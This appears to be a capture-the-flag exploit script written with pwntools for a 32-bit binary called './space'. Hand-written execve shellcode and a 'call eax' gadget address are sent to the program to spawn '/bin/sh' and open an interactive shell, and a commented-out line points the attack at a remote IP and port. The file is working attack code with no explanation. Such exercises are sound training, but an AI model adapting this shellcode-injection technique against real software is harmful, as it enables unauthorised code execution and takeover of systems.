from pwn import *

context.arch = "i386"
shellcode = """
push 0xb 
pop eax
xor ecx ,ecx
xor edx ,edx
add esp ,0x4
mov ebx ,esp
int 0x80
nop
nop
nop
nop
"""
shellcode = asm(shellcode)
#r = remote("157.245.33.77" ,32000)
r = process("./space")
e = ELF("./space")
gadget = 0x08049019                     #address of "call eax" instruction
exploit = shellcode + p32(gadget) + b"/bin/sh\x00"
r.sendafter('> ' ,exploit)
r.interactive()
